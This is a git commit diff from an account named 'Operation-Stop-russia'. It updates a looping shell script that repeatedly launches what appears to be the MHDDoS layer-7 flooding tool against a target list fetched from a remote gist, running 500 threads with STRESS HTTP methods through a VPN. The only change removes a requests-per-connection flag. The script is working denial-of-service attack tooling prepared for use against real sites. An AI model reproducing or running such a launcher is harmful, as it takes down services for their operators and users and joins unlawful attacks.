f47bba35187b58f94dbdd6c783f2568745be52e4
Operation-Stop-russia <103530329+Operation-Stop-russia@users.noreply.github.com>
2022-06-05 02:59:42 +0300

    Update Start_L7_test.sh

--- Start_L7_test.sh
+++ Start_L7_test.sh
@@ -9,6 +9,6 @@ while true
 do
    pkill -f runner.py
    sleep 7
-   python3 runner.py -c https://gist.githubusercontent.com/ddosukraine2022/f739250dba308a7a2215617b17114be9/raw/mhdos_targets_url_v2.txt -t 500 --http-methods STRESS --vpn --rpc 350 --lang en
+   python3 runner.py -c https://gist.githubusercontent.com/ddosukraine2022/f739250dba308a7a2215617b17114be9/raw/mhdos_targets_url_v2.txt -t 500 --http-methods STRESS --vpn --lang en
 sleep 9m
 done
